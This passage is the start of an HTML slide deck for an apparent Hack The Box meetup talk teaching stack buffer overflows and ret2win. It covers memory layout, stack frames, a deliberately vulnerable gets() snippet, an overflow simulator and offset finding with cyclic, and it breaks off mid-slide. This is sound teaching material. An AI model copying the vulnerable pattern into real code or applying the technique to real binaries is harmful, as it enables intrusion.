@@ -1,0 +1,1525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Meetup IIUM - Intro to PWN: Interactive Visual Slides</title>
+<style>
+  :root {
+    --bg-main: #070d17;
+    --bg-card: #0f192a;
+    --bg-card-alt: #16243b;
+    --bg-code: #040810;
+    --htb-green: #9fef00;
+    --htb-green-glow: rgba(159, 239, 0, 0.3);
+    --cyber-blue: #00d4ff;
+    --cyber-purple: #a855f7;
+    --danger-red: #ff3366;
+    --warning-orange: #ff9900;
+    --text-main: #f1f5f9;
+    --text-muted: #94a3b8;
+    --border-subtle: #1e293b;
+    --border-accent: rgba(159, 239, 0, 0.4);
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background-color: var(--bg-main);
+    color: var(--text-main);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    line-height: 1.5;
+    overflow: hidden;
+    height: 100vh;
+    width: 100vw;
+  }
+
+  #app {
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+    width: 100vw;
+  }
+
+  /* Header */
+  header.top-bar {
+    height: 54px;
+    background: rgba(7, 13, 23, 0.95);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border-subtle);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 24px;
+    z-index: 100;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-weight: 700;
+    font-size: 1.05rem;
+  }
+
+  .brand-badge {
+    background: var(--htb-green);
+    color: #0b111b;
+    font-size: 0.72rem;
+    font-weight: 800;
+    padding: 2px 8px;
+    border-radius: 4px;
+    text-transform: uppercase;
+    box-shadow: 0 0 10px var(--htb-green-glow);
+  }
+
+  .nav-controls {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .btn {
+    background: var(--bg-card);
+    border: 1px solid var(--border-subtle);
+    color: var(--text-main);
+    padding: 6px 12px;
+    border-radius: 6px;
+    font-size: 0.82rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    user-select: none;
+  }
+
+  .btn:hover {
+    background: var(--bg-card-alt);
+    border-color: var(--htb-green);
+    color: #fff;
+    box-shadow: 0 0 12px var(--htb-green-glow);
+  }
+
+  .btn-primary {
+    background: var(--htb-green);
+    color: #070d17;
+    border-color: var(--htb-green);
+  }
+
+  .btn-primary:hover {
+    background: #b2ff1a;
+    color: #000;
+  }
+
+  .slide-counter {
+    font-family: ui-monospace, "SF Mono", monospace;
+    font-size: 0.85rem;
+    color: var(--text-muted);
+  }
+
+  .progress-container {
+    height: 3px;
+    background: var(--border-subtle);
+    width: 100%;
+    z-index: 101;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--cyber-blue), var(--htb-green));
+    width: 0%;
+    transition: width 0.25s ease-out;
+  }
+
+  /* Slide Stage */
+  main.slide-stage {
+    flex: 1;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .slide {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    padding: 28px 48px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    opacity: 0;
+    pointer-events: none;
+    transform: scale(0.985) translateY(12px);
+    transition: opacity 0.25s cubic-bezier(0.16, 1, 0.3, 1), transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+    overflow-y: auto;
+  }
+
+  .slide.active {
+    opacity: 1;
+    pointer-events: auto;
+    transform: scale(1) translateY(0);
+    z-index: 10;
+  }
+
+  /* Typography */
+  h1.slide-title {
+    font-size: 2.2rem;
+    font-weight: 800;
+    letter-spacing: -0.6px;
+    color: #ffffff;
+    line-height: 1.15;
+    margin-bottom: 4px;
+  }
+
+  h1.slide-title span.accent {
+    color: var(--htb-green);
+    text-shadow: 0 0 20px var(--htb-green-glow);
+  }
+
+  h2.slide-subtitle {
+    font-size: 1.1rem;
+    font-weight: 600;
+    color: var(--cyber-blue);
+    margin-bottom: 18px;
+  }
+
+  /* Visual Cards & Diagrams */
+  .grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    width: 100%;
+  }
+
+  .grid-3 {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 16px;
+    width: 100%;
+  }
+
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-subtle);
+    border-radius: 10px;
+    padding: 18px;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+    position: relative;
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 12px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border-subtle);
+  }
+
+  .card-title {
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: #ffffff;
+  }
+
+  /* Visual Architecture Diagrams (SVG / Canvas / Styled Boxes) */
+  .diagram-flow {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    margin: 14px 0;
+  }
+
+  .diagram-node {
+    flex: 1;
+    background: var(--bg-card-alt);
+    border: 1px solid var(--border-subtle);
+    border-radius: 8px;
+    padding: 14px 10px;
+    text-align: center;
+    position: relative;
+    transition: all 0.2s;
+  }
+
+  .diagram-node:hover {
+    border-color: var(--htb-green);
+    transform: translateY(-2px);
+    box-shadow: 0 4px 14px rgba(0,0,0,0.4);
+  }
+
+  .diagram-node.active-node {
+    border-color: var(--htb-green);
+    background: rgba(159, 239, 0, 0.08);
+  }
+
+  .diagram-arrow {
+    font-size: 1.2rem;
+    color: var(--htb-green);
+    font-weight: bold;
+    user-select: none;
+  }
+
+  /* Visual Memory Map */
+  .mem-map-wrapper {
+    display: flex;
+    gap: 20px;
+    height: 440px;
+  }
+
+  .mem-ladder {
+    width: 320px;
+    display: flex;
+    flex-direction: column;
+    border: 2px solid #334155;
+    border-radius: 10px;
+    overflow: hidden;
+    background: #040810;
+  }
+
+  .mem-chunk {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 14px;
+    font-weight: 600;
+    font-size: 0.88rem;
+    cursor: pointer;
+    border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
+    transition: all 0.2s ease;
+  }
+
+  .mem-chunk:hover, .mem-chunk.selected {
+    filter: brightness(1.3);
+    transform: scale(1.02);
+    z-index: 2;
+    box-shadow: 0 0 18px rgba(0,0,0,0.7);
+  }
+
+  .mem-chunk.stack { background: #3b185f; color: #f3e8ff; border-left: 6px solid #a855f7; }
+  .mem-chunk.gap { background: #070c14; color: #475569; font-style: italic; cursor: default; }
+  .mem-chunk.heap { background: #064e3b; color: #a7f3d0; border-left: 6px solid #10b981; }
+  .mem-chunk.bss { background: #713f12; color: #fef08a; border-left: 6px solid #eab308; }
+  .mem-chunk.data { background: #1e3a8a; color: #bfdbfe; border-left: 6px solid #3b82f6; }
+  .mem-chunk.text { background: #450a0a; color: #fecaca; border-left: 6px solid #ef4444; }
+
+  .mem-addr {
+    font-family: ui-monospace, monospace;
+    font-size: 0.72rem;
+    opacity: 0.8;
+  }
+
+  /* Interactive Stack Frame Graphic */
+  .stack-frame-box {
+    display: flex;
+    flex-direction: column;
+    border: 2px solid #334155;
+    border-radius: 8px;
+    overflow: hidden;
+    font-family: ui-monospace, monospace;
+  }
+
+  .frame-cell {
+    padding: 12px 16px;
+    border-bottom: 1px solid #1e293b;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 0.88rem;
+    transition: all 0.3s;
+  }
+
+  .frame-cell.ret-addr { background: #4c0519; color: #fecdd3; border-left: 6px solid var(--danger-red); font-weight: bold; }
+  .frame-cell.saved-rbp { background: #713f12; color: #fef08a; border-left: 6px solid #eab308; font-weight: bold; }
+  .frame-cell.buffer { background: #064e3b; color: #a7f3d0; border-left: 6px solid #10b981; }
+  .frame-cell.corrupted-cell { background: rgba(255, 51, 102, 0.25) !important; color: #fff !important; }
+  .frame-cell.pwned-cell { background: rgba(159, 239, 0, 0.25) !important; color: var(--htb-green) !important; }
+
+  /* Interactive Simulator */
+  .sim-slider-bar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 12px;
+  }
+
+  input[type="range"] {
+    flex: 1;
+    accent-color: var(--htb-green);
+    cursor: pointer;
+  }
+
+  /* Visual 16-byte Alignment Diagram */
+  .alignment-visual {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin: 12px 0;
+  }
+
+  .align-row {
+    display: flex;
+    align-items: center;
+    padding: 8px 12px;
+    border-radius: 6px;
+    border: 1px solid #334155;
+    font-family: ui-monospace, monospace;
+    font-size: 0.85rem;
+    justify-content: space-between;
+  }
+
+  .align-row.bad {
+    background: rgba(255, 51, 102, 0.15);
+    border-color: var(--danger-red);
+    color: #fca5a5;
+  }
+
+  .align-row.good {
+    background: rgba(159, 239, 0, 0.15);
+    border-color: var(--htb-green);
+    color: var(--htb-green);
+  }
+
+  /* Code Block */
+  pre.code-block {
+    background: var(--bg-code);
+    border: 1px solid var(--border-subtle);
+    border-radius: 8px;
+    padding: 14px;
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    font-size: 0.85rem;
+    color: #e2e8f0;
+    overflow-x: auto;
+    line-height: 1.48;
+    position: relative;
+  }
+
+  code.inline {
+    background: rgba(255, 255, 255, 0.08);
+    color: var(--htb-green);
+    padding: 2px 5px;
+    border-radius: 4px;
+    font-family: ui-monospace, monospace;
+    font-size: 0.88em;
+  }
+
+  .highlight-green { color: var(--htb-green); font-weight: bold; }
+  .highlight-red { color: var(--danger-red); font-weight: bold; }
+  .highlight-blue { color: var(--cyber-blue); font-weight: bold; }
+  .highlight-purple { color: var(--cyber-purple); font-weight: bold; }
+  .highlight-orange { color: var(--warning-orange); font-weight: bold; }
+  .highlight-muted { color: #64748b; }
+
+  /* Tab System */
+  .tab-nav {
+    display: flex;
+    gap: 8px;
+    border-bottom: 1px solid var(--border-subtle);
+    margin-bottom: 12px;
+  }
+
+  .tab-btn {
+    background: transparent;
+    border: none;
+    color: var(--text-muted);
+    font-weight: 600;
+    font-size: 0.85rem;
+    padding: 6px 12px;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .tab-btn.active {
+    color: var(--htb-green);
+    border-bottom-color: var(--htb-green);
+  }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* Overview Modal */
+  .overview-modal {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: rgba(7, 13, 23, 0.95);
+    backdrop-filter: blur(16px);
+    z-index: 200;
+    display: none;
+    flex-direction: column;
+    padding: 30px 40px;
+    overflow-y: auto;
+  }
+
+  .overview-modal.open { display: flex; }
+
+  .overview-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 16px;
+    margin-top: 20px;
+  }
+
+  .slide-thumb {
+    background: var(--bg-card);
+    border: 1px solid var(--border-subtle);
+    border-radius: 8px;
+    padding: 14px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    height: 140px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+  }
+
+  .slide-thumb:hover {
+    border-color: var(--htb-green);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
+  }
+
+  .slide-thumb.current {
+    border-color: var(--htb-green);
+    box-shadow: 0 0 12px var(--htb-green-glow);
+  }
+
+  .bottom-bar {
+    height: 38px;
+    background: #040810;
+    border-top: 1px solid var(--border-subtle);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 24px;
+    font-size: 0.78rem;
+    color: var(--text-muted);
+  }
+
+  kbd {
+    background: #1e293b;
+    color: #cbd5e1;
+    padding: 2px 6px;
+    border-radius: 4px;
+    border: 1px solid #334155;
+  }
+
+  @media (max-width: 900px) {
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+    .mem-map-wrapper { flex-direction: column; height: auto; }
+    .mem-ladder { width: 100%; height: 200px; }
+    h1.slide-title { font-size: 1.8rem; }
+    .slide { padding: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<div id="app">
+  <!-- Top Navigation -->
+  <header class="top-bar">
+    <div class="brand">
+      <span class="brand-badge">HTB Meetup IIUM</span>
+      <span>Intro to PWN: Interactive Diagram Slides</span>
+    </div>
+
+    <div class="nav-controls">
+      <span class="slide-counter" id="slideIndicator">Slide 1 / 15</span>
+      <button class="btn" id="btnPrev" title="Previous Slide (←)">◀ Prev</button>
+      <button class="btn btn-primary" id="btnNext" title="Next Slide (→, Space)">Next ▶</button>
+      <button class="btn" id="btnOverview" title="Slide Overview (O)">🗂 Overview</button>
+      <button class="btn" id="btnFullscreen" title="Fullscreen (F)">⛶ Fullscreen</button>
+    </div>
+  </header>
+
+  <!-- Progress Bar -->
+  <div class="progress-container">
+    <div class="progress-fill" id="progressBar"></div>
+  </div>
+
+  <!-- Slides Stage -->
+  <main class="slide-stage" id="slideStage">
+
+    <!-- Slide 1: Welcome & Overview -->
+    <section class="slide active" data-title="Title & Welcome">
+      <div style="max-width: 960px;">
+        <span class="brand-badge" style="font-size: 0.85rem; padding: 4px 10px; margin-bottom: 14px; display: inline-block;">HACK THE BOX MEETUP IIUM 2025</span>
+        <h1 class="slide-title">Intro to <span class="accent">PWN</span>: ret2win</h1>
+        <h2 class="slide-subtitle">Interactive, Diagram-Driven Guide to Stack Exploitation</h2>
+        <p style="font-size: 1.05rem; color: var(--text-muted); margin-bottom: 24px; line-height: 1.6;">
+          Low-level binary exploitation demystified through live interactive memory models, animated stack corruption simulators, and real challenge walkthroughs.
+        </p>
+
+        <div class="grid-2">
+          <div class="card">
+            <h3 style="color: var(--htb-green); font-size: 1.1rem; margin-bottom: 8px;">Speaker &amp; Writeup</h3>
+            <p style="font-size: 1.05rem; font-weight: 700; color: #fff;">Mohammad Danish Hakim (Jerit3787)</p>
+            <p style="font-size: 0.9rem; color: var(--text-muted);">CS (Network &amp; Security) • MCC Alumni • RE:UN1ON</p>
+            <div style="margin-top: 14px; padding: 10px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px;">
+              <span style="font-size: 0.88rem; color: var(--text-main);">Official Writeup:</span><br>
+              <a href="https://ctf.danplace.tech/posts/htb-meetup-iium/" target="_blank" style="color: var(--htb-green); font-weight: bold; text-decoration: none;">https://ctf.danplace.tech/posts/htb-meetup-iium/</a>
+            </div>
+          </div>
+
+          <div class="card">
+            <h3 style="color: var(--cyber-blue); font-size: 1.1rem; margin-bottom: 8px;">Visual Roadmap</h3>
+            <div class="diagram-flow" style="flex-direction: column; gap: 8px;">
+              <div class="diagram-node active-node" style="width: 100%; text-align: left; padding: 8px 14px;">
+                <span class="highlight-green">01.</span> Memory Architecture &amp; The Stack Frame
+              </div>
+              <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 14px;">
+                <span class="highlight-blue">02.</span> Live Interactive Buffer Overflow Simulator
+              </div>
+              <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 14px;">
+                <span class="highlight-orange">03.</span> Hands-On Practice (x86 &amp; x64 ret2win)
+              </div>
+              <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 14px;">
+                <span class="highlight-purple">04.</span> Mini-CTF Challenges &amp; 16-byte Alignment
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 2: From Source to Silicon Diagram -->
+    <section class="slide" data-title="Source to Machine Code">
+      <h1 class="slide-title">From Source Code to <span class="accent">Machine Instructions</span></h1>
+      <h2 class="slide-subtitle">How high-level C abstractions vanish into raw memory addresses</h2>
+
+      <div class="diagram-flow">
+        <div class="diagram-node">
+          <div style="font-size: 1.5rem;">📄</div>
+          <strong style="color: #60a5fa;">C Source Code</strong>
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Variables, arrays, gets()</div>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node">
+          <div style="font-size: 1.5rem;">⚙️</div>
+          <strong style="color: var(--htb-green);">GCC Compiler</strong>
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Translates to Assembly</div>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node">
+          <div style="font-size: 1.5rem;">📦</div>
+          <strong style="color: var(--warning-orange);">ELF Executable</strong>
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">x86 / x64 Machine Code</div>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node active-node">
+          <div style="font-size: 1.5rem;">🧠</div>
+          <strong style="color: var(--danger-red);">CPU &amp; Stack</strong>
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Linear Memory Addresses</div>
+        </div>
+      </div>
+
+      <div class="grid-2" style="margin-top: 14px;">
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">What the Programmer Imagines</h3>
+          <pre class="code-block"><span class="highlight-purple">void</span> <span class="highlight-green">vulnerable</span>() {
+    <span class="highlight-purple">char</span> buffer[64];  <span class="highlight-muted">// "Only 64 bytes fit here!"</span>
+    gets(buffer);
+}</pre>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 8px;">
+            The programmer expects the variable <code class="inline">buffer</code> to exist as an isolated container that safely holds up to 64 characters.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--danger-red); font-size: 1rem; margin-bottom: 8px;">What the CPU Actually Sees</h3>
+          <pre class="code-block"><span class="highlight-blue">sub</span> rsp, 0x40         <span class="highlight-muted">; Move stack pointer down 64 bytes</span>
+<span class="highlight-blue">call</span> gets             <span class="highlight-muted">; Reads stdin until newline</span>
+<span class="highlight-red">ret</span>                   <span class="highlight-muted">; Pops whatever is at RSP into RIP!</span></pre>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 8px;">
+            The CPU has no concept of bounds. It writes contiguous bytes into memory, easily overflowing into adjacent registers and return addresses!
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 3: Interactive Process Memory Map -->
+    <section class="slide" data-title="Process Memory Layout">
+      <h1 class="slide-title">Linux Process <span class="accent">Memory Map</span></h1>
+      <h2 class="slide-subtitle">Click any segment to inspect its address boundaries, permissions, and exploit role</h2>
+
+      <div class="mem-map-wrapper">
+        <div class="mem-ladder" id="memLadder">
+          <div class="mem-chunk stack selected" data-seg="stack">
+            <span>Stack (↓ grows down)</span>
+            <span class="mem-addr">0x7fffffffffff</span>
+          </div>
+          <div class="mem-chunk gap">
+            <span>[ Unmapped Space ]</span>
+            <span class="mem-addr">...</span>
+          </div>
+          <div class="mem-chunk heap" data-seg="heap">
+            <span>Heap (↑ grows up)</span>
+            <span class="mem-addr">0x555555600000</span>
+          </div>
+          <div class="mem-chunk bss" data-seg="bss">
+            <span>BSS (Uninitialized Globals)</span>
+            <span class="mem-addr">0x555555558000</span>
+          </div>
+          <div class="mem-chunk data" data-seg="data">
+            <span>Data (Initialized Globals)</span>
+            <span class="mem-addr">0x555555557000</span>
+          </div>
+          <div class="mem-chunk text" data-seg="text">
+            <span>Text / Code (Instructions)</span>
+            <span class="mem-addr">0x555555554000</span>
+          </div>
+        </div>
+
+        <div class="card" style="flex: 1; display: flex; flex-direction: column; justify-content: center; padding: 24px;">
+          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+            <h3 id="inspectTitle" style="font-size: 1.4rem; color: #fff;">The Stack</h3>
+            <span id="inspectPerms" class="brand-badge" style="background: #a855f7; color: #fff;">RW- (Read / Write)</span>
+          </div>
+          <p id="inspectDesc" style="font-size: 1rem; color: var(--text-main); margin-bottom: 16px; line-height: 1.6;">
+            Grows downward from high to low memory. Holds local variables (e.g. <code class="inline">buffer[64]</code>) and the critical <strong>Return Address (RIP/EIP)</strong> that dictates where the CPU jumps when a function finishes.
+          </p>
+          <div style="padding: 12px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px;">
+            <strong style="color: var(--htb-green); font-size: 0.95rem;">⚔️ Exploitation Target:</strong>
+            <p id="inspectSec" style="font-size: 0.88rem; color: var(--text-muted); margin-top: 4px;">
+              Target of Stack Buffer Overflows! Excessive input overflows past the buffer and overwrites the Return Address, granting total control of the CPU's instruction pointer.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: Anatomy of a Stack Frame Diagram -->
+    <section class="slide" data-title="Stack Frame Anatomy">
+      <h1 class="slide-title">Anatomy of a <span class="accent">Stack Frame</span></h1>
+      <h2 class="slide-subtitle">Visualizing function boundaries and why overflow reaches the return address</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 10px;">The Opposing Directions</h3>
+          <div style="display: flex; flex-direction: column; gap: 12px;">
+            <div style="padding: 12px; background: rgba(168, 85, 247, 0.15); border-left: 4px solid var(--cyber-purple); border-radius: 4px;">
+              <strong style="color: #e9d5ff;">1. Stack Allocation Direction:</strong>
+              <div style="font-size: 0.88rem; color: var(--text-muted); margin-top: 2px;">
+                Grows <strong>DOWNWARDS</strong> (High Address ➔ Low Address). When <code class="inline">vulnerable()</code> is called, the Return Address is placed higher in memory than the local buffer.
+              </div>
+            </div>
+
+            <div style="padding: 12px; background: rgba(159, 239, 0, 0.15); border-left: 4px solid var(--htb-green); border-radius: 4px;">
+              <strong style="color: var(--htb-green);">2. Buffer Fill Direction:</strong>
+              <div style="font-size: 0.88rem; color: var(--text-muted); margin-top: 2px;">
+                Buffers are written <strong>UPWARDS</strong> (Low Address ➔ High Address). Writing beyond 64 bytes naturally climbs straight into Saved RBP and the Return Address!
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px; text-align: center;">Stack Frame Schematic</h3>
+          <div class="stack-frame-box">
+            <div class="frame-cell" style="background: #111e33; color: #94a3b8;">
+              <span>[High Address] Caller Stack Frame</span>
+              <span>Parameters / Previous State</span>
+            </div>
+            <div class="frame-cell ret-addr">
+              <span>🎯 Return Address (RIP)</span>
+              <span>8 Bytes (Target of Attack!)</span>
+            </div>
+            <div class="frame-cell saved-rbp">
+              <span>Saved Base Pointer (RBP)</span>
+              <span>8 Bytes (Caller Frame Anchor)</span>
+            </div>
+            <div class="frame-cell buffer" style="padding: 22px 16px;">
+              <div>
+                <strong>Local Buffer (char buffer[64])</strong><br>
+                <span style="font-size: 0.78rem; color: #6ee7b7;">▲ Memory writes grow upward toward RBP &amp; RIP</span>
+              </div>
+              <span>64 Bytes</span>
+            </div>
+            <div class="frame-cell" style="background: #040810; color: #64748b; font-size: 0.78rem; text-align: center;">
+              [Low Address - Top of Stack (RSP)]
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 5: The Buffer Overflow Mechanic Diagram -->
+    <section class="slide" data-title="Buffer Overflow Mechanic">
+      <h1 class="slide-title">The <span class="accent">Buffer Overflow</span> Mechanic</h1>
+      <h2 class="slide-subtitle">Step-by-step diagram of how memory clobbering occurs</h2>
+
+      <div class="diagram-flow">
+        <div class="diagram-node">
+          <strong style="color: var(--htb-green);">Step 1: Normal State</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Input &lt;= 64B. Buffer holds data safely. RIP intact.</p>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node">
+          <strong style="color: var(--warning-orange);">Step 2: Buffer Full (64B)</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Buffer is completely filled. Next byte overflows.</p>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node">
+          <strong style="color: #fde047;">Step 3: Clobber RBP (+8B)</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">72 bytes written. Saved RBP is corrupted.</p>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node active-node">
+          <strong style="color: var(--danger-red);">Step 4: Hijack RIP (+8B)</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">80 bytes written. Return Address replaced with win()!</p>
+        </div>
+      </div>
+
+      <div class="card" style="margin-top: 14px;">
+        <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Visual Memory State: Normal vs Exploited</h3>
+        <pre class="code-block">    NORMAL STACK                       EXPLOITED STACK
+   +-----------------------+          +-----------------------+
+   | Return Address: 0x401290 |          | Return Address: <span class="highlight-green">0x4011b6</span> |  &lt;-- <span class="highlight-green">Jumps to win()!</span>
+   +-----------------------+          +-----------------------+
+   | Saved RBP: 0x7fffffffe860|          | Saved RBP: <span class="highlight-red">0x4141414141414141</span>|  &lt;-- <span class="highlight-red">Clobbered!</span>
+   +-----------------------+          +-----------------------+
+   | buffer[64]: "Hello"   |          | buffer[64]: <span class="highlight-red">'A' * 64</span>   |  &lt;-- <span class="highlight-red">Filled to brim!</span>
+   +-----------------------+</pre>
+      </div>
+    </section>
+
+    <!-- Slide 6: LIVE INTERACTIVE OVERFLOW SIMULATOR -->
+    <section class="slide" data-title="Live Simulator">
+      <h1 class="slide-title">Live <span class="accent">Interactive Overflow Simulator</span></h1>
+      <h2 class="slide-subtitle">Drag the slider or click presets to watch memory cells corrupt in real-time</h2>
+
+      <div class="card" style="padding: 20px;">
+        <div class="sim-slider-bar">
+          <span style="font-weight: bold; font-size: 0.9rem;">Payload Length:</span>
+          <input type="range" id="simRange" min="0" max="88" value="32" oninput="onSimRangeChange(this.value)">
+          <span id="simRangeVal" style="font-family: monospace; font-size: 0.95rem; color: var(--cyber-blue); width: 80px;">32 Bytes</span>
+
+          <div style="display: flex; gap: 6px;">
+            <button class="btn" onclick="setSlider(32)">Normal (32B)</button>
+            <button class="btn" onclick="setSlider(64)">Fit (64B)</button>
+            <button class="btn" onclick="setSlider(72)">RBP (72B)</button>
+            <button class="btn" onclick="setSlider(80)">Crash (80B)</button>
+            <button class="btn btn-primary" onclick="setSlider(80, true)">🎯 ret2win</button>
+          </div>
+        </div>
+
+        <div class="stack-frame-box" style="margin: 12px 0;">
+          <div class="frame-cell" id="simRowBuf" style="background: #064e3b; color: #a7f3d0;">
+            <span style="font-weight: bold;">Local Buffer (0..63)</span>
+            <span id="simBufText">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (32B filled)</span>
+            <span style="color: var(--text-muted);">64 Bytes</span>
+          </div>
+          <div class="frame-cell" id="simRowRbp" style="background: #713f12; color: #fef08a;">
+            <span style="font-weight: bold;">Saved RBP (64..71)</span>
+            <span id="simRbpText">0x7fffffffe860 (Valid Caller RBP)</span>
+            <span style="color: var(--text-muted);">8 Bytes</span>
+          </div>
+          <div class="frame-cell" id="simRowRip" style="background: #4c0519; color: #fecdd3;">
+            <span style="font-weight: bold;">Return Address (72..79)</span>
+            <span id="simRipText">0x0000000000401290 (&lt;main+80&gt;)</span>
+            <span style="color: var(--text-muted);">8 Bytes</span>
+          </div>
+        </div>
+
+        <div id="simHud" style="padding: 12px 18px; border-radius: 6px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; background: rgba(59, 130, 246, 0.15); border: 1px solid #3b82f6; color: #60a5fa;">
+          <span id="simHudStatus">🟢 Normal Execution: Function returns safely to caller.</span>
+          <span id="simHudRip" style="font-family: monospace;">RIP = 0x401290</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 7: Finding Offsets with cyclic & pwndbg Diagram -->
+    <section class="slide" data-title="Offset Finding with cyclic">
+      <h1 class="slide-title">Calculating Offsets: <span class="accent">cyclic &amp; pwndbg</span></h1>
+      <h2 class="slide-subtitle">Never guess payload sizes — calculate exact byte distances mathematically</h2>
+
+      <div class="diagram-flow">
+        <div class="diagram-node">
+          <strong style="color: var(--cyber-blue);">1. cyclic 100</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Generate non-repeating 4B/8B De Bruijn sequence</p>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node">
+          <strong style="color: var(--danger-red);">2. Run &amp; Crash</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">GDB captures the faulting value in EIP / stack</p>
+        </div>
+        <div class="diagram-arrow">➔</div>
+        <div class="diagram-node active-node">
+          <strong style="color: var(--htb-green);">3. cyclic -l &lt;val&gt;</strong>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Instantly reveals exact offset distance</p>
+        </div>
+      </div>
+
+      <div class="grid-2" style="margin-top: 14px;">
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Interactive Pattern Decoder</h3>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px;">
+            Test the crash values from Danish's writeup:
+          </p>
+          <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+            <button class="btn" onclick="testPattern('taaa', 76, 'x86 Hands-on')">Crash 'taaa'</button>
+            <button class="btn" onclick="testPattern('jaaaaaaa', 72, 'x64 Hands-on')">Crash 'jaaaaaaa'</button>
+            <button class="btn" onclick="testPattern('faaaaaaa', 40, 'x64 Mini-CTF')">Crash 'faaaaaaa'</button>
+          </div>
